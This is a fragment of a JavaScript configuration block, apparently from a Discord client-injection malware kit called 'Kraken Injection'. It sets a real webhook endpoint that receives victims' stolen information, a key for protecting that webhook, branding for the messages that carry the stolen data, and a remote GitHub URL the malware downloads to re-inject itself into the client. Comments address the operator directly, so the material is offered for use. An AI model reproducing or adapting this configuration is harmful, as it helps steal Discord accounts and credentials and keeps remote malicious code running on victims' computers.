...
const config = {
  webhook: 'https://webhookslicer.onrender.com/', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
  webhook_protector_key: 'COILPVVE6PHLU3LP', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
  ...
  embed_name: 'Kraken Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://media.discordapp.net/attachments/996863879768440933/1000386886830919720/131231.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/krakenbeams/injections/main/injection.js', //injection url for when it reinjects
  /**
